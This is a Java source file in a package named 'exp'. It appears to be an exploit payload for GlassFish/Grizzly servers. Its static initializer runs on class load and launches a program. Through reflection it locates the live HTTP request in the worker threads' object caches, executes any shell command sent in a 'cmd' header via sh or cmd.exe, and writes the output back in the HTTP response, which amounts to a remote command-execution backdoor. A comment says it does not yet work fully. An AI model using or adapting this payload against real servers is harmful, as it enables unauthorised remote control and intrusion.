package com.firebasky.exp;

/**
 * TargetObject = {org.glassfish.grizzly.threadpool.DefaultWorkerThread}
 *   ---> group = {java.lang.ThreadGroup}
 *    ---> threads = {class [Ljava.lang.Thread;}
 *     ---> [17] = {org.glassfish.grizzly.threadpool.DefaultWorkerThread}
 *      ---> objectCache = {org.glassfish.grizzly.ThreadCache$ObjectCache}
 *       ---> objectCacheElements = {class [Lorg.glassfish.grizzly.ThreadCache$ObjectCacheElement;}
 *        ---> [3] = {org.glassfish.grizzly.ThreadCache$ObjectCacheElement}
 *         ---> cache = {class [Ljava.lang.Object;}
 *          ---> [0] = {org.glassfish.grizzly.http.server.Request}
 */


/**
 * GlassFish 回显 有问题获得的res为null,等待完善
 */
public class Echo_Request {
    static {
        try {
            getResponse();
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void getResponse() throws Exception {
        Thread thread = Thread.currentThread();
        java.lang.reflect.Field threadLocals = Thread.class.getDeclaredField("group");
        threadLocals.setAccessible(true);
        Object threadLocalMap = threadLocals.get(thread);

        Class threadLocalMapClazz = Class.forName("java.lang.ThreadGroup");
        java.lang.reflect.Field  tableField = threadLocalMapClazz.getDeclaredField("threads");
        tableField.setAccessible(true);
        Object[] objects = (Object[]) tableField.get(threadLocalMap);

        Class entryClass = Class.forName("org.glassfish.grizzly.threadpool.DefaultWorkerThread");
        java.lang.reflect.Field  entryValueField = entryClass.getDeclaredField("objectCache");
        entryValueField.setAccessible(true);

        for (Object object : objects) {
            if (object != null) {
                Object valueObject = entryValueField.get(object);
                if (valueObject != null) {
                    if (valueObject.getClass().getName().equals("org.glassfish.grizzly.ThreadCache$ObjectCache")) {
                        java.lang.reflect.Field objectCacheElements = valueObject.getClass().getDeclaredField("objectCacheElements");
                        objectCacheElements.setAccessible(true);
                        Object[] objects1 = (Object[]) objectCacheElements.get(valueObject);

                        Class<?> aClass = Class.forName("org.glassfish.grizzly.ThreadCache$ObjectCacheElement");
                        java.lang.reflect.Field cache = aClass.getDeclaredField("cache");
                        cache.setAccessible(true);

                        for (Object o : objects1) {
                            if (o != null) {
                                Object[] objects2 = (Object[]) cache.get(o);
                                for (Object o1 : objects2) {
                                    if(o1.getClass().getName().equals("org.glassfish.grizzly.http.server.Request")){
                                        //response
                                        org.glassfish.grizzly.http.server.Response getResponse = (org.glassfish.grizzly.http.server.Response) o1.getClass().getMethod("getResponse").invoke(o1);
                                        //request
                                        org.glassfish.grizzly.http.server.Request getRequest = (org.glassfish.grizzly.http.server.Request) o1.getClass().getMethod("getRequest").invoke(o1);
                                        String cmd1 = getRequest.getHeader("cmd");
                                        String[] cmd = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", cmd1} : new String[]{"cmd.exe", "/c",cmd1};
                                        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
                                        java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
                                        String output = s.hasNext() ? s.next() : "";
                                        getResponse.getWriter().write(output);
                                        getResponse.getWriter().write("by Firebasky");
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
